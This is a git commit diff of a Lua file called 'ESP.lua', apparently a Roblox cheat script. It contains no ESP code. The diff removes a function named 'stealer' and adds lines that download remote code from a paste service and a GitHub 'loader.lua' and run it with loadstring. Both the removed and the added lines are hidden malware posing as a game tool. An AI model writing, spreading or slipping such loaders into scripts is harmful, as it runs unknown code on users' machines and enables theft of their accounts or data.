1002ff16b1e29e60726d8dea66bf1956f2a4e554
NoLag-id <sfpher6@gmail.com>
2025-07-28 23:41:03 +0800

    Update ESP.lua

--- ESP.lua
+++ ESP.lua
@@ -1,9 +1,2 @@
-local function stealer()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/7c11e007/", true))()
-end
-local function farm()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/azbalalaff/loading-screen/refs/heads/main/loader.lua"))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/mXDd8nWdZnVtfdvz/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/azbalalaff/loading-screen/refs/heads/main/loader.lua"))()
